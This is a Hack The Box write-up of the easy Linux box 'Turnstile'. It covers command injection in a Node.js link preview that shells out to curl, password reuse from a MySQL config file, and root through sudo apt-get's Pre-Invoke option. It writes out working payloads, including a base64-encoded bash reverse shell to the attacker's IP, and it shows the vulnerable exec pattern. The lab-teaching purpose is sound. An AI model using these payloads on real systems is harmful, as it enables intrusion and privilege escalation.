---
title: 'turnstile — Node.js command injection in URL preview → user pivot via MySQL password reuse → sudo apt-get pre-invoke to root'
description: 'HTB Easy Linux: Express app on port 3000 has a link preview feature that passes user URLs to curl via child_process.exec with insufficient sanitization, command injection gives shell as app user, MySQL credentials in config.js reused for local user account, user has sudo on apt-get which allows pre-invoke command execution for root'
pubDate: '2026-05-07'
category: 'writeups'
---

**HTB · Linux · Easy**

Turnstile is a clean three-step Easy box. The foothold is command injection in a Node.js link preview endpoint that shells out to `curl`. The user pivot is password reuse from a MySQL config file. The root is `sudo apt-get` with a pre-invoke hook. Each step is one concept, no rabbit holes, good for building fundamentals.

```text
target  : 10.129.45.118
attacker: 10.10.14.57
```

## ports

```text
22/tcp   OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp   nginx 1.18.0 (→ Node.js reverse proxy)
3000/tcp Node.js Express (direct access)
```

Nginx on 80 proxies to the same Express app on 3000. Both show the same content. SSH for later.

## phase 1 — web application recon

The site is a social bookmarking app — "Turnstile Links" — where users save and share URLs. Public features: browse links, search, register, login. After registering an account and logging in, you get a dashboard with a form to submit new links.

When you submit a URL, the app fetches a preview — title, description, thumbnail. The preview generation happens server-side. I submitted a URL pointing at my listener:

```bash
python3 -m http.server 8000
```

Submit `http://10.10.14.57:8000/test`:

```text
10.129.45.118 - - [07/May/2026 14:22:31] "GET /test HTTP/1.1" 404 -
```

The request comes from the target. The User-Agent header:

```text
User-Agent: curl/7.81.0
```

The app is shelling out to `curl` to fetch URLs. That's the signal. If the URL is passed to `curl` via `child_process.exec()` with string interpolation instead of `execFile()` with an argument array, it's command injection.

## phase 2 — command injection

Test with a basic injection. The URL input has client-side validation (must start with `http://` or `https://`), but the server-side check is what matters. Try a semicolon:

```text
http://10.10.14.57:8000/test;id
```

Submitted via Burp to bypass the client-side JS validation. The preview returned an error ("Could not fetch preview"), but my listener got the request and then the response came back with the preview text containing `uid=1001(app) gid=1001(app) groups=1001(app)`.

The app is doing something like:

```javascript
const { exec } = require('child_process');
exec(`curl -s -L -m 5 "${url}"`, (err, stdout, stderr) => {
    // parse stdout for title/description
});
```

The double quotes around `${url}` prevent simple semicolon injection from breaking out of the `curl` argument, but they don't prevent *command substitution* inside double quotes. Test with `$()`:

```text
http://10.10.14.57:8000/$(id)
```

My listener got a request for `/uid=1001(app)gid=1001(app)groups=1001(app)` — the `$(id)` was evaluated inside the double quotes and the output became part of the URL. Full command injection confirmed.

Reverse shell. URL-encode and use a bash reverse shell via command substitution:

```text
http://10.10.14.57:8000/$(bash -c 'bash -i >& /dev/tcp/10.10.14.57/9001 0>&1')
```

That has special characters that will break. Cleaner approach — base64 encode the payload:

```bash
echo 'bash -i >& /dev/tcp/10.10.14.57/9001 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ny85MDAxIDA+JjEK
```

Submit:

```text
http://10.10.14.57:8000/$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ny85MDAxIDA+JjEK|base64 -d|bash)
```

```bash
nc -lnvp 9001
```

```text
connect to [10.10.14.57] from (UNKNOWN) [10.129.45.118] 38744
app@turnstile:~/turnstile-app$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```

Shell as `app`. Upgrade TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## phase 3 — lateral movement via password reuse

The `app` user runs the Node.js application. Check the app's config:

```bash
cat /home/app/turnstile-app/config.js
```

```javascript
module.exports = {
    port: 3000,
    session_secret: "turnstile_s3ss10n_k3y",
    db: {
        host: "localhost",
        user: "turnstile_db",
        password: "Turnst1le_MySQL_2024!",
        database: "turnstile"
    }
};
```

MySQL credentials. Check what other users exist on the box:

```bash
cat /etc/passwd | grep -v nologin | grep -v false | grep bash
```

```text
root:x:0:0:root:/root:/bin/bash
emily:x:1000:1000:Emily Chen:/home/emily:/bin/bash
app:x:1001:1001::/home/app:/bin/bash
```

One real user: `emily`. Try the MySQL password:

```bash
su - emily
Password: Turnst1le_MySQL_2024!
```

```text
emily@turnstile:~$ id
uid=1000(emily) gid=1000(emily) groups=1000(emily),27(sudo)
```

Password reuse. Emily is in the `sudo` group. User flag in `/home/emily/user.txt`.

## phase 4 — sudo apt-get → root

```bash
sudo -l
```

```text
Matching Defaults entries for emily on turnstile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User emily may run the following commands on turnstile:
    (root) NOPASSWD: /usr/bin/apt-get update
```

Emily can run `apt-get update` as root without a password. This is a known GTFOBins escalation. `apt-get` supports `Pre-Invoke` and `Post-Invoke` options that execute arbitrary commands during operation:

```bash
sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::="/bin/bash"
```

```text
root@turnstile:~# whoami
root
```

The `-o APT::Update::Pre-Invoke::="/bin/bash"` option tells apt-get to run `/bin/bash` before performing the update. Since apt-get runs as root (via sudo), the shell spawns as root.

Root flag in `/root/root.txt`.

## tl;dr

```text
Node.js link preview → child_process.exec with user URL in double quotes
  → command substitution: $(echo <b64>|base64 -d|bash)
  → reverse shell as app
  → MySQL password in config.js reused for emily account
  → sudo apt-get update (NOPASSWD)
  → Pre-Invoke option → root shell
```
